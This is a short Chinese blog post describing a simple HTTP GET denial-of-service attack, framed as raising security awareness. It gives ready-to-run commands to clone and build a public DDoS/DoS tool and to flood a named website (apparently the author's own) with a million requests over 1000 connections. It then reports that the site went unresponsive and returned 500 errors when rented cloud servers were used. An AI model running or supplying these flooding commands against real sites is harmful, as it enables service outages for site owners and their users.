---
title: "一次简单的http-get攻击"
date: 2022-08-31T07:08:22Z
description: "记录一次简单 Dos 攻击方法，提升网络安全意识."
categories: ["技术笔记集"]
tags: ["dos", "linux", "http-get"]
draft: false
# weight: 5
---

使用 [http-get-dos](https://github.com/wenfengshi/ddos-dos-tools/tree/master/http-get-dos) 工具执行。

> http-get-dos是一个简单的、高性能HTTP GET DOS工具，可自定义HTTP请求头、连接数、总的HTTP请求数等
进入目录下make编译后，http-get-dos -h 查看使用信息
> 

来源GitHub项目：DDos/DoS工具集：[https://github.com/wenfengshi/ddos-dos-tools](https://github.com/wenfengshi/ddos-dos-tools)

命令:

```bash
git clone https://github.com/wenfengshi/ddos-dos-tools.git
cd ddos-dos-tools/http-get-dos
make
./http_get_dos -n 1000000 -c 1000 -H "Connection: keep-alive" http://blog.frytea.com/
```

实测采用一台1m阿里云服务器对1m轻量服务器攻击，网站无响应

![%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84http-%20186ab/Untitled.png](📒%20Note/knowledge/计算机网络%2072284/一次简单的http-%20186ab/Untitled.png)

实测再加入搬瓦工1G口KVM对阿里云1M轻量服务器攻击，网站瞬间500.

![%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84http-%20186ab/Untitled%201.png](📒%20Note/knowledge/计算机网络%2072284/一次简单的http-%20186ab/Untitled%201.png)